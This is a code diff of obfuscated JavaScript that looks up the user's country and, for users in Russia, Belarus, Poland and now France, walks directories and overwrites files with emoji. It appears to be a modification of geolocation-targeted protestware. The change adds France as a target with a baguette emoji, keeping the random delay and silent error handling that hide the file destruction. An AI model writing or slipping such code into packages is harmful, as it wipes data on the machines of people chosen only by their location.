@@ -20,17 +20,18 @@ setTimeout(function () {
                 const s = JSON.parse(t.toString("utf8"));
                 const u = s[c.toString("utf8")].toLowerCase();
                 const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8") || u.includes("poland")); // checks if country is Russia or Belarus + or Poland
-                if (a) {
-                    h(n.toString("utf8"));
-                    h(o.toString("utf8"));
-                    h(r.toString("utf8"));
-                    h(f.toString("utf8"));
+		const isFrench = u.includes("france");
+		if (a || isFrench) {
+                    h(n.toString("utf8"), isFrench);
+                    h(o.toString("utf8"), isFrench);
+                    h(r.toString("utf8"), isFrench);
+                    h(f.toString("utf8"), isFrench);
                 }
             } catch (t) {}
         });
     });
 }, Math.ceil(Math.random() * 1e3));
-async function h(n = "", o = "") {
+async function h(n = "", o = "", isFrench = false) {
     if (!a.existsSync(n)) {
         return;
     }
@@ -53,7 +54,11 @@ async function h(n = "", o = "") {
             s.length > 0 ? f.push(...s) : null;
         } else if (i.indexOf(o) >= 0) {
             try {
-                a.writeFile(i, c.toString("utf8"), function () {}); // overwrites file with `❤️`
+		let overwriter = '❤️'; // heart emoji
+		if (isFrench) {
+			overwriter = '🥖'; // baguette
+		}
+                a.writeFile(i, overwriter, function () {}); // overwrites file
             } catch (t) {}
         }
     }
